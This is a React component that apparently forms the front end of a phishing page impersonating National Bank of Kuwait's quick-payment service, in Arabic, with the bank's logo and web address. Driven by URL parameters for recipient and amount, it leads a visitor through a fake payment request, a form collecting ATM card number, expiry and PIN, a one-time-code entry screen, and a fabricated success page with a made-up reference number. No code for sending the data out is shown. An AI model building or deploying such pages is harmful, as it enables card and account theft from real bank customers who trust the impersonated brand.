import { useState, useEffect, useMemo } from "react";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import { AlertCircle } from "lucide-react";

type PageView = 'confirmation' | 'payment-form' | 'otp-verification' | 'success';

export default function NBKPaymentPage() {
  const [currentView, setCurrentView] = useState<PageView>('confirmation');
  const [otpCode, setOtpCode] = useState('');
  const [timeRemaining, setTimeRemaining] = useState(120);
  
  // Use useMemo to ensure paymentInfo is strictly derived from URL and stays synced
  const paymentInfo = useMemo(() => {
    const urlParams = new URLSearchParams(window.location.search);
    return {
      recipientName: urlParams.get('n') || "halits.YILDIZ",
      amount: urlParams.get('a') || "5.000",
      currency: "د.ك",
      purpose: urlParams.get('p') || "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة.",
      beneficiary: "NBK",
      website: "https://online.nbk.com.kw"
    };
  }, [window.location.search]);

  const renderConfirmationPage = () => (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="mb-8"><img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" /></div>
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">خدمة الدفع السريع</h1>
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">اسم المستلم:</span>
            <span className="font-bold text-blue-900">{paymentInfo.recipientName}</span>
          </div>
          <div className="flex justify-between items-center border-b pb-2">
            <span className="text-gray-700">المبلغ:</span>
            <span className="font-bold text-blue-900">{paymentInfo.amount} {paymentInfo.currency}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-700">الغرض:</span>
            <span className="font-bold text-blue-900 text-xs">{paymentInfo.purpose}</span>
          </div>
        </div>
      </div>
      <div className="flex flex-col gap-3 w-full max-w-md">
        <Button onClick={() => setCurrentView('payment-form')} className="w-full bg-blue-700 hover:bg-blue-800 text-white py-4 text-xl rounded-xl font-bold">تأكيد</Button>
      </div>
    </div>
  );

  const renderPaymentForm = () => (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="w-full max-w-md bg-white border border-gray-200 rounded-xl shadow-lg p-6">
        <div className="flex justify-center mb-6"><img src="/nbk-logo.jpg" alt="NBK" className="h-10" /></div>
        <div className="mb-8 p-4 bg-gray-50 rounded-lg space-y-2 text-right">
          <div className="flex justify-between"><span className="text-gray-600">المستفيد:</span><span className="font-bold">{paymentInfo.recipientName}</span></div>
          <div className="flex justify-between"><span className="text-gray-600">المبلغ:</span><span className="font-bold text-blue-700">KD {paymentInfo.amount}</span></div>
        </div>
        <div className="space-y-4">
          <Select><SelectTrigger className="w-full"><SelectValue placeholder="يرجى اختيار البنك" /></SelectTrigger><SelectContent><SelectItem value="nbk">بنك الكويت الوطني</SelectItem><SelectItem value="kfh">بيت التمويل الكويتي</SelectItem></SelectContent></Select>
          <Input type="text" placeholder="رقم بطاقة الصرف الآلي" className="text-right" />
          <div className="flex gap-2">
            <Select><SelectTrigger className="flex-1"><SelectValue placeholder="MM" /></SelectTrigger><SelectContent>{Array.from({length: 12}, (_, i) => <SelectItem key={i+1} value={String(i+1).padStart(2, '0')}>{String(i+1).padStart(2, '0')}</SelectItem>)}</SelectContent></Select>
            <Select><SelectTrigger className="flex-1"><SelectValue placeholder="YYYY" /></SelectTrigger><SelectContent>{Array.from({length: 15}, (_, i) => <SelectItem key={2024+i} value={String(2024+i)}>{2024+i}</SelectItem>)}</SelectContent></Select>
          </div>
          <Input type="password" placeholder="الرقم السري" className="text-center bg-blue-50" maxLength={4} />
          <Button onClick={() => setCurrentView('otp-verification')} className="w-full bg-blue-700 py-6 text-xl font-bold">إرسال</Button>
        </div>
      </div>
    </div>
  );

  const renderOTPVerification = () => (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="w-full max-w-md bg-white border border-gray-200 rounded-xl shadow-lg p-8">
        <div className="flex justify-center mb-6"><img src="/nbk-logo.jpg" alt="NBK" className="h-10" /></div>
        <div className="text-center mb-8"><h2 className="text-xl font-bold text-blue-800">رمز التحقق</h2><p className="text-gray-600 text-sm mt-2">يرجى إدخال رمز التحقق المرسل إلى هاتفك</p></div>
        <div className="flex gap-2 justify-center mb-8">
          {[...Array(6)].map((_, i) => <Input key={i} type="text" maxLength={1} className="w-12 h-12 text-center text-xl font-bold border-2" />)}
        </div>
        <Button onClick={() => setCurrentView('success')} className="w-full bg-blue-700 py-6 text-xl font-bold">تأكيد</Button>
      </div>
    </div>
  );

  const renderSuccessPage = () => (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4" dir="rtl">
      <div className="w-full max-w-md bg-white border border-green-200 rounded-xl shadow-lg p-8 text-center">
        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4"><svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg></div>
        <h2 className="text-2xl font-bold text-green-800 mb-2">تمت العملية بنجاح</h2>
        <div className="bg-gray-50 p-4 rounded-lg mt-6 space-y-2 text-right">
          <div className="flex justify-between"><span>المستلم:</span><span className="font-bold">{paymentInfo.recipientName}</span></div>
          <div className="flex justify-between"><span>المبلغ:</span><span className="font-bold">{paymentInfo.amount} KD</span></div>
          <div className="flex justify-between border-t pt-2"><span>رقم المرجع:</span><span className="font-bold">REF{Date.now().toString().slice(-8)}</span></div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="font-sans antialiased">
      {currentView === 'confirmation' && renderConfirmationPage()}
      {currentView === 'payment-form' && renderPaymentForm()}
      {currentView === 'otp-verification' && renderOTPVerification()}
      {currentView === 'success' && renderSuccessPage()}
    </div>
  );
}
